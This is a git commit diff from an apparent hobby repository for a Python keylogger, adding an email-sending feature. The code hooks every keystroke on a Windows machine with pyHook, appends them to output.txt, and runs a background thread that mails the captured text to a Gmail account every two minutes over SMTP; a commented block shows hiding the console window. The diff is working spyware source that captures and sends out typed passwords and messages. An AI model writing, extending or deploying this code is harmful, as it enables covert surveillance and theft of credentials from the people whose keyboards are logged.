d63b460dbcc412d161e6e2929ed38488bf5e16f6
JJunHan <62248328+JJunHan@users.noreply.github.com>
2021-07-20 23:25:20 +0800

    added email service

--- README.md
+++ README.md
@@ -1,8 +1,38 @@
 # Python Keylogger
 
-Using Pyhook to implement a keylogger that tracks keystrokes
-
+> - Using Pyhook to implement a keylogger that tracks keystrokes and records them in a text file.
+> - Sends an email containing the contents of the above text file every X minutes (currently 2 minutes)
 
 ## TODO
 
-- [ ] Send via email?
+- [x] Send via email
+- [x] Map the keys to values
+- [x] Threading Function for email
+
+## Key mapping
+
+```python
+mapping = { 8: "<BackSpace>",
+            9: "<tab>",
+            13: "<enter>\n",
+            19: "<pause>",
+            20: "<capslock>",
+            27: "<esc>", 
+            32: " ",
+            36: "<home>",
+            37: "<arrowleft>", 38: "<arrowup>", 39: "<arrowright>", 40: "<arrowdown>",
+            44: "<printscreen>",
+            46: "<del>", 
+            91: "<win>",
+            97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
+            106: "*", 107: "+", 109: "-", 110: ".", 111: "/",
+            112: "<f1>", 113: "<f2>", 114: "<f3>", 115: "<f4>", 116: "<f5>", 117: "<f6>", 118: "<f7>",
+            119: "<f8>", 120: "<f9>", 121: "<f10>", 121: "<f11>", 122: "<f12>",
+            144: "<numlock>",
+            160: "<lshft>", 161: "<rshft>",
+            162: "<lctr>", 163: "<rctr>",
+            164: "<lalt>", 165: "<ralt>", 
+            186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 192: "`",
+            219: "[", 220: "\\", 221: "]", 222: "'",
+            }
+```
--- key_main.py
+++ key_main.py
@@ -4,6 +4,19 @@ import win32gui
 import pythoncom, pyHook
 import processing as p
 from pyHook.HookManager import HookConstants
+import smtplib, ssl
+from email.message import EmailMessage
+import threading
+import datetime
+
+
+CONTEXT = ssl.create_default_context()
+SERVER = "smtp.gmail.com"
+PORT = 587
+USER="my97testac@gmail.com"
+PASS="XXX"
+FROM = USER
+TO = ["my97testac@gmail.com"]
 
 '''
 win = win32console.GetConsoleWindow()
@@ -12,6 +25,68 @@ win32gui.ShowWindow(win, 0) //3 for max size
 # http://pyhook.sourceforge.net/doc_1.5.0/pyhook.HookManager.KeyboardEvent-class.html
 # http://www.asciitable.com/
 '''
+
+def OnKeyboardEvent(event):
+    data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt, event.KeyID)
+    print(event.KeyID)  
+
+    # open output.txt to read current keystrokes
+    f = open('output.txt', 'r+')
+    buffer = f.read()
+    f.close()
+
+    # do the flitering here
+    keylogs_ID = event.KeyID
+    buffer += p.verify(keylogs_ID)
+
+    # open output.txt to write current + new keystrokes
+    f = open('output.txt', 'w')
+    f.write(buffer)
+    f.close()
+    return 0
+
+
+class TimerClass(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.event = threading.Event()
+        self.filename = "output.txt"
+    
+    def run(self): # overload the function for threading
+        while not self.event.is_set(): # while flag is false
+            with open(self.filename, 'rt') as fp:
+                # Create a text/plain message
+                msg = EmailMessage()
+                msg.set_content(fp.read())
+            ts = datetime.datetime.now().isoformat(timespec='seconds') 
+            msg['Subject'] = f'The contents of {self.filename} , at {ts}'
+            msg['From'] = FROM
+            msg['To'] = ", ".join(TO)
+            
+            try:
+                server = smtplib.SMTP(SERVER)
+                server.connect(SERVER,PORT)
+                server.starttls(context=CONTEXT)
+                server.login(USER,PASS)
+                server.sendmail(FROM, TO, msg.as_string())
+                print("Successfully sent email")
+                server.quit()
+            except Exception as e:
+                print (e)
+
+            self.event.wait(120) # blocking for 120 seconds before checking the flag status again
+
+if __name__ == '__main__':
+    # start email thread at 120s interval
+    email=TimerClass()
+    email.start()
+    # create a hook manager object
+    hm = pyHook.HookManager()
+    hm.KeyDown = OnKeyboardEvent
+    # set the hook
+    hm.HookKeyboard()
+    # wait forever
+    pythoncom.PumpMessages()
 
 
 '''
@@ -29,7 +104,6 @@ win32gui.ShowWindow(win, 0) //3 for max size
     print 'Alt', event.Alt
     print 'Transition', event.Transition
     print '---'
-
 '''
 
 ''' # Possible to check for specific controls
@@ -41,30 +115,3 @@ def OnKeyboardEvent(event):
     shift_pressed = pyHook.GetKeyState(HookConstants.VKeyToID('VK_LSHIFT'))
     print(shift_pressed)
 '''
-def OnKeyboardEvent(event):
-    data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt, event.KeyID)
-    print(event.KeyID)  
-
-    # open output.txt to read current keystrokes
-    f = open('output.txt', 'r+')
-    buffer = f.read()
-    f.close()
-
-    # do the flitering here
-    keylogs_ID = event.KeyID
-    buffer += p.verify(keylogs_ID)
-    #print(p.verify(keylogs_ID))
-
-    # open output.txt to write current + new keystrokes
-    f = open('output.txt', 'w')
-    f.write(buffer)
-    f.close()
-    return 0
-
-# create a hook manager object
-hm = pyHook.HookManager()
-hm.KeyDown = OnKeyboardEvent
-# set the hook
-hm.HookKeyboard()
-# wait forever
-pythoncom.PumpMessages()
